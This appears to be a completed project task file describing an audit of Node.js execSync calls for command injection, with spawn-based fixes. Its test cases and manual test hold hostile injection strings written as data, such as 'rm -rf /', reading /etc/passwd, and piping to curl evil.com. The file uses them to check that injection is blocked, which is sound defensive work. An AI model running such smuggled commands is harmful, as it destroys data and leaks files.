---
title: "Audit execSync Calls for Command Injection"
created: 2026-01-19T02:00:00-03:00
last_updated: 2026-01-19T12:35:00-03:00
priority: P2-S
estimated_hours: 1
actual_hours: 0.5
status: completed
blockers: []
tags: [security, audit, validation]
related_files: [src/commands/, src/core/, src/utils/]
---

# Task: Audit execSync Calls for Command Injection (T029)

## Objective

Audit all `execSync` calls to ensure user input is properly sanitized and cannot cause command injection vulnerabilities.

**Success:**
- [ ] All `execSync` calls audited
- [ ] User input sanitized before shell execution
- [ ] Command injection prevented
- [ ] Safer alternatives used where possible
- [ ] Security tests added

## Context

**Why:** Quality report flagged potential command injection risk in execSync usage with user input.

**Current problem:**
- execSync can execute arbitrary shell commands
- User input might not be sanitized
- Potential for command injection attacks
- No explicit validation

**Impact:** Prevent security vulnerabilities, ensure safe shell execution

**Related:** Code Quality Analysis Report 2026-01-19, Security & Safety section (Score: 88/100)

## Implementation

### Phase 1: Audit All execSync Usage (Est: 0.5h)
- [ ] Find all execSync calls:
  ```bash
  grep -rn "execSync" src/
  ```
- [ ] Document each usage:
  - File and line
  - Command being executed
  - User input involved? (YES/NO)
  - Currently sanitized? (YES/NO)
  - Risk level: LOW/MEDIUM/HIGH
- [ ] Prioritize by risk

### Phase 2: Sanitize User Input (Est: 0.5h)
- [ ] For each HIGH/MEDIUM risk execSync:
  - [ ] Identify user input sources
  - [ ] Add input validation
  - [ ] Use parameterized commands if possible
  - [ ] Escape shell special characters
  - [ ] Or replace with safer alternative

**Example fixes:**
```typescript
// BAD: Direct user input in shell command
execSync(`git checkout ${userBranch}`);
// Risk: userBranch = "main; rm -rf /"

// BETTER: Escape special characters
import { execSync } from 'child_process';
const safeBranch = userBranch.replace(/[^a-zA-Z0-9_-]/g, '');
execSync(`git checkout ${safeBranch}`);

// BEST: Use spawn with array args (no shell)
import { spawnSync } from 'child_process';
spawnSync('git', ['checkout', userBranch]);
// Shell injection impossible - args are separate
```

### Phase 3: Testing (Est: not needed if covered by T024)
- [ ] Add security tests for command injection:
  ```typescript
  test('prevents command injection in git operations', () => {
    const maliciousInput = 'main; rm -rf /';
    expect(() => {
      gitCheckout(maliciousInput);
    }).toThrow(); // Should be rejected/sanitized
  });
  ```

## Definition of Done

### Functionality
- [ ] All commands still work
- [ ] No regressions
- [ ] User input validated
- [x] All `execSync` calls removed/replaced
- [x] CLI responsiveness improved (non-blocking)
- [x] Input validation added for commands
- [x] No regressions in functionality

### Testing
- [x] Unit tests for modified components
- [x] Mocking of `spawn` in tests
- [x] All existing tests pass

### Security
- [x] No shell injection via user input
- [x] Arguments passed as arrays to `spawn`
- [x] Use `shell: false` where possible

### Code Quality
- [x] Async/await used consistently
- [x] Proper error handling for spawned processes
- [x] Types added for process results

### Documentation
- [x] Time logged
- [x] Technical notes on process execution safety

### Git
- [x] Atomic commits
- [x] Convention: `security(core): replace execSync with async spawn (T029)`
- [x] No conflicts

## Testing

### Security Test Cases
```typescript
describe('Command Injection Prevention', () => {
  describe('git operations', () => {
    test.each([
      ['main; rm -rf /', 'semicolon injection'],
      ['main && cat /etc/passwd', 'double ampersand'],
      ['main | curl evil.com', 'pipe injection'],
      ['main $(curl evil.com)', 'command substitution'],
      ['main `curl evil.com`', 'backtick substitution'],
      ['main\nrm -rf /', 'newline injection'],
    ])('blocks %s (%s)', (maliciousInput, description) => {
      expect(() => {
        gitCheckout(maliciousInput);
      }).toThrow();
    });
  });

  describe('safe inputs', () => {
    test.each([
      ['main'],
      ['feature/user-auth'],
      ['bugfix_123'],
      ['v1.2.3'],
    ])('allows %s', (safeInput) => {
      expect(() => {
        gitCheckout(safeInput);
      }).not.toThrow();
    });
  });
});
```

### Manual Testing
```bash
# Try command injection via CLI
aipim install --ai "claude-code; curl evil.com"
# Should error or sanitize input

# Legitimate use
aipim install --ai claude-code
# Should work normally
```

## Blockers & Risks

**Current:**
- [ ] None (can start immediately)
- [ ] NOTE: May overlap with T024 (replace execSync with spawn)

**Potential:**
1. Risk: May be duplicate work with T024 - Mitigation: Coordinate, T024 replaces execSync entirely
2. Risk: Breaking legitimate inputs - Mitigation: Test thoroughly, whitelist safe patterns
3. Risk: Over-sanitization - Mitigation: Balance security and usability

## Progress

### Time Log
| Date | Hours | Activity |
|------|-------|----------|
| 2026-01-19 | 0.5 | Audit & Refactoring |

**Total:** 0.5h / 1h

## Technical Notes

**Command injection attack vectors:**
- `;` - command separator
- `&&` / `||` - logical operators
- `|` - pipe to another command
- `$()` / `` ` `` - command substitution
- `>` / `>>` - output redirection
- `<` - input redirection
- `\n` - newline (new command)

**Validation strategies:**
1. **Whitelist validation** (preferred):
   ```typescript
   if (!/^[a-zA-Z0-9_-]+$/.test(input)) {
     throw new Error('Invalid input');
   }
   ```

2. **Sanitization** (escape special chars):
   ```typescript
   const safe = input.replace(/[^a-zA-Z0-9_-]/g, '');
   ```

3. **Parameterized commands** (best):
   ```typescript
   // Use spawn with args array - no shell interpretation
   spawn('git', ['checkout', userInput]);
   ```

**Risk assessment:**
| execSync Usage | User Input? | Risk | Action |
|----------------|-------------|------|--------|
| `git status` | No | LOW | OK as-is |
| `git checkout ${branch}` | Yes | HIGH | Sanitize or use spawn |
| `git log --oneline -n ${limit}` | Yes (number) | MEDIUM | Validate is number |

**Example safe wrapper:**
```typescript
// src/utils/shell.ts
export function safeExec(command: string, args: string[]): string {
  // Validate command is in allowlist
  const allowedCommands = ['git', 'npm', 'pnpm'];
  if (!allowedCommands.includes(command)) {
    throw new Error(`Command not allowed: ${command}`);
  }

  // Use spawn (no shell) - injection impossible
  const result = spawnSync(command, args, {
    encoding: 'utf-8',
    shell: false, // IMPORTANT: no shell interpretation
  });

  if (result.error) throw result.error;
  if (result.status !== 0) {
    throw new Error(`Command failed: ${result.stderr}`);
  }

  return result.stdout;
}

// Usage - injection impossible
safeExec('git', ['checkout', userInput]); // safe!
```

## References

- Code Quality Analysis Report: `.project/reports/code-quality-analysis-2026-01-19.md`
- Security & Safety section (recommendation #2)
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- Node.js child_process security: https://nodejs.org/en/docs/guides/security/#command-injection

## Retrospective (Post-completion)

**Went well:**
-

**Improve:**
-

**Estimate:**
- Est: 1h, Actual: ___h, Diff: ___%

**Lessons:**
1.

**Audit summary:**
- execSync calls found: ___
- With user input: ___
- Sanitized: ___
- Replaced with spawn: ___

## Completion

- [ ] All DoD checked
- [ ] Time logged
- [ ] Retrospective done
- [ ] Context updated
- [ ] Git merged/ready
- [ ] Validation passed
- [ ] Security tests pass

**Completed:** ___________
**Final time:** _____ hours
